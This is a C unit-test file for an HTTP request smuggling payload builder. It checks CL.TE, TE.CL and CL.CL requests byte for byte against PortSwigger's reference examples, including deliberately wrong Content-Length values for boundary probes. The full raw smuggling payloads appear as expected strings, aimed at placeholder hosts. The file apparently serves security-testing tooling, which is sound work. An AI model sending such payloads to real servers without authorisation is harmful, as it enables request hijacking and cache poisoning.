#include <assert.h>
#include <stdio.h>
#include <string.h>

#include "rawhttp/smuggle.h"

static void dump(const char *label, const char *data, size_t len) 
{
    printf("--- %s ---\n", label);
    for (size_t i = 0; i < len; i++) putchar(data[i] == '\r' ? '.' : data[i]);
    printf("\n---\n");
}

static void check(const char *label, rh_buf *buf, const char *expected) 
{
    dump(label, buf->data, buf->len);
    assert(buf->len == strlen(expected));
    assert(memcmp(buf->data, expected, buf->len) == 0);
}

/* --- rh_smuggle_parse_technique --- */
static void test_parse_technique(void) 
{
    rh_smuggle_technique t;
    assert(rh_smuggle_parse_technique("cl.te", &t) == RH_OK && t == RH_SMUGGLE_CL_TE);
    assert(rh_smuggle_parse_technique("te.cl", &t) == RH_OK && t == RH_SMUGGLE_TE_CL);
    assert(rh_smuggle_parse_technique("cl.cl", &t) == RH_OK && t == RH_SMUGGLE_CL_CL);
    assert(rh_smuggle_parse_technique("CL.TE", &t) == RH_OK && t == RH_SMUGGLE_CL_TE);
    assert(rh_smuggle_parse_technique("bogus", &t) == RH_ERR_PARSE);
    printf("test_parse_technique passed\n");
}

/* --- byte-exact match against PortSwigger's canonical CL.TE example --- */
static void test_cl_te_matches_portswigger_example(void) 
{
    rh_buf out;
    rh_err e = rh_smuggle_build(RH_SMUGGLE_CL_TE, "vulnerable-website.com", "/", "SMUGGLED", -1,
                                 -1, &out);
    assert(e == RH_OK);

    const char *expected = "POST / HTTP/1.1\r\n"
                           "Host: vulnerable-website.com\r\n"
                           "Content-Length: 13\r\n"
                           "Transfer-Encoding: chunked\r\n"
                           "\r\n"
                           "0\r\n"
                           "\r\n"
                           "SMUGGLED";
    check("CL.TE (PortSwigger reference)", &out, expected);

    rh_buf_free(&out);
    printf("test_cl_te_matches_portswigger_example passed\n");
}

/* --- byte-exact match against PortSwigger's canonical TE.CL example --- */
static void test_te_cl_matches_portswigger_example(void) 
{
    rh_buf out;
    rh_err e = rh_smuggle_build(RH_SMUGGLE_TE_CL, "vulnerable-website.com", "/", "SMUGGLED", -1,
                                 -1, &out);
    assert(e == RH_OK);

    const char *expected = "POST / HTTP/1.1\r\n"
                           "Host: vulnerable-website.com\r\n"
                           "Content-Length: 3\r\n"
                           "Transfer-Encoding: chunked\r\n"
                           "\r\n"
                           "8\r\n"
                           "SMUGGLED\r\n"
                           "0\r\n"
                           "\r\n";
    check("TE.CL (PortSwigger reference)", &out, expected);

    rh_buf_free(&out);
    printf("test_te_cl_matches_portswigger_example passed\n");
}

/* --- CL.CL: default (matching) lengths, then a deliberate mismatch --- */
static void test_cl_cl(void)
{
    rh_buf out;
    rh_err e = rh_smuggle_build(RH_SMUGGLE_CL_CL, "example.com", "/", "hello", -1, -1, &out);
    assert(e == RH_OK);
    const char *expected_default = "POST / HTTP/1.1\r\n"
                                   "Host: example.com\r\n"
                                   "Content-Length: 5\r\n"
                                   "Content-Length: 5\r\n"
                                   "\r\n"
                                   "hello";
    check("CL.CL (default, matching)", &out, expected_default);
    rh_buf_free(&out);

    /* the actual point: independently override each length to create
     * the conflict a real test needs */
    e = rh_smuggle_build(RH_SMUGGLE_CL_CL, "example.com", "/", "helloXXX", 5, 8, &out);
    assert(e == RH_OK);
    const char *expected_mismatch = "POST / HTTP/1.1\r\n"
                                    "Host: example.com\r\n"
                                    "Content-Length: 5\r\n"
                                    "Content-Length: 8\r\n"
                                    "\r\n"
                                    "helloXXX";
    check("CL.CL (deliberate mismatch: 5 vs 8)", &out, expected_mismatch);
    rh_buf_free(&out);

    printf("test_cl_cl passed\n");
}

/* --- overrides let the caller build an intentionally "wrong" payload,
 * e.g. for off-by-one boundary testing - the builder must never
 * "correct" what's asked for --- */
static void test_overrides_never_corrected(void) 
{
    rh_buf out;
    /* CL.TE with a Content-Length one byte SHORT of what's actually
     * there - a classic off-by-one probe */
    rh_err e = rh_smuggle_build(RH_SMUGGLE_CL_TE, "x", "/", "SMUGGLED", 12, -1, &out);
    assert(e == RH_OK);
    const char *expected = "POST / HTTP/1.1\r\n"
                           "Host: x\r\n"
                           "Content-Length: 12\r\n" /* wrong on purpose - real len is 13 */
                           "Transfer-Encoding: chunked\r\n"
                           "\r\n"
                           "0\r\n"
                           "\r\n"
                           "SMUGGLED";
    check("CL.TE with deliberately wrong Content-Length", &out, expected);
    rh_buf_free(&out);
    printf("test_overrides_never_corrected passed\n");
}

static void test_rejects_empty_smuggled(void) 
{
    rh_buf out;
    rh_err e = rh_smuggle_build(RH_SMUGGLE_CL_TE, "x", "/", "", -1, -1, &out);
    printf("test_rejects_empty_smuggled: %s\n", rh_strerror(e));
    assert(e == RH_ERR_INVAL);
    printf("test_rejects_empty_smuggled passed\n");
}

signed main(void) 
{
    test_parse_technique();
    test_cl_te_matches_portswigger_example();
    test_te_cl_matches_portswigger_example();
    test_cl_cl();
    test_overrides_never_corrected();
    test_rejects_empty_smuggled();
    printf("all T3.2 smuggling payload builder checks passed\n");
    return 0;
}
